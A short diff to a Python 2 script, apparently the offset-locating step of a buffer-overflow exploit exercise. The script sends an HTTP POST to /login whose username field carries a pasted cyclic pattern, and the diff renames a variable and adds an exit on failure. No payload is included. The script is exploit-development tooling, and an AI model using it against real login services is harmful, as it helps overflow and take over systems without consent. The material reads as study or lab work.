@@ -1,5 +1,5 @@
-#!/usr/bin/python
-import socket
+#!/usr/bin/python2
+import sys, socket
 
 # Paste Pattern Created into line 11
 # Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 15-23
@@ -8,9 +8,9 @@ import socket
 try:
   print "\nLocating Offset..."
 
-  inputBuffer = ""
+  offset = ""
   
-  content = "username=" + inputBuffer + "&password=A"
+  content = "username=" + offset + "&password=A"
 
   buffer = "POST /login HTTP/1.1\r\n"
   buffer += "Host: x.x.x.x\r\n"
@@ -36,3 +36,4 @@ try:
   
 except:
   print "\nCould not connect!"
+  sys.exit()
